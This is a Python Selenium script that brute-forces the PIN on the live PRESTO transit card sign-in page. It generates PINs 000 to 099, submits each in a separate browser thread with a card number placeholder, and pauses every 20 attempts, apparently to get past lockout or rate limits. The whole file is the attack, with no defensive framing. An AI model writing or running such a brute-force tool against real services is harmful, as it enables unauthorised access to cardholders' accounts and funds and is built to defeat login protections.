from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import ui
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import threading
import time
# from time import time

def passmaker():
    for i in range(0,10):
        for j in range(0,10):
            password_Arr.append(str(0)+str(i)+str(j))



def open(password):
    options = webdriver.ChromeOptions()
    options.add_experimental_option("detach", True)
    driver = webdriver.Chrome("chromedriver_win32\\chromedriver.exe",options=options)
    # driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    
    

    base_url = "https://prestocardprodb2c.b2clogin.com/b2cprestocard.net/b2c_1a_prestocard_cws_signin/oauth2/v2.0/authorize?client_id=c76de212-35a6-4fca-b10d-fed07c5ba879&redirect_uri=https%3A%2F%2Fwww.prestocard.ca&response_type=code%20id_token&scope=openid%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Fsecurity%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Fsales%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2FProduct%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Fmedia%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Finfo%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Fcustomer%20https%3A%2F%2Fb2cprestocard.net%2FPFM%2Fapi%2Faccount&state=OpenIdConnect.AuthenticationProperties%3DtlLIMtMFtcwoMqwiwLeITSvR-17vqWS24NJ5hRZlzCVFy6gsDxSpEDXuLga7fxZQraae5JIT-7ND7BCww6L5cavjonfeFpadeLooRD_QX4KKLHhS13RqmavtvDm8I3l7TWg9xi-Ab4n3bEns7SdKO8pCiNibWeMWSyJ4-OZEVSAEG2qX&response_mode=form_post&ui_locales=en&x-client-SKU=ID_NET461&x-client-ver=5.3.0.0"

    
    driver.get(base_url)
    driver.implicitly_wait(3)
    ## //*[@id="PrestoCardNumber"]

    act=ActionChains(driver)

    # username=driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
    username=ui.WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="PrestoCardNumber"]')))

    # username.
    card_number = "Enter your card number"
    card_input = driver.find_element(by=By.XPATH, value='//*[@id="PrestoCardNumber"]')
    card_input.send_keys(card_number)

    password_input = driver.find_element(by=By.XPATH, value='//*[@id="PrestoCardPin"]')
    password_input.send_keys(password)

    # submit_button = driver.find_element_by_xpath('//*[@id="continue"]')
    submit_button = driver.find_element(by=By.XPATH, value='//*[@id="continue"]')

    submit_button.click()


i=0
password_Arr = []
passmaker()
for password in password_Arr:
    if i==20 or i==40 or i==60 or i==80:
        time.sleep(150)
    
    print("\nTesting : ",password)
    i=i+1
    threading.Thread(target=open,args=(password,)).start()

